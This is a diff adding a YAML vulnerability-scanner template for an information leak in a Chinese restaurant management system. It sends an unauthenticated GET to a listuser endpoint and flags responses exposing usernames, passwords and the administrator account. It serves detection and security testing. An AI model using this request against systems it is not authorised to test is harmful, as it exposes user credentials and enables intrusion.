@@ -1,0 +1,28 @@
+id: poc-yaml-can-xing-yun-listuser-info-leak
+info:
+  name: 喰星云-数字化餐饮服务系统 listuser 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  description: |
+    Detects information leakage vulnerability in 喰星云-数字化餐饮服务系统 through the listuser endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/chainsales/head/user/listuser"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username":'
+          - '"pwd":'
+          - '"rname":"系统管理员"'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
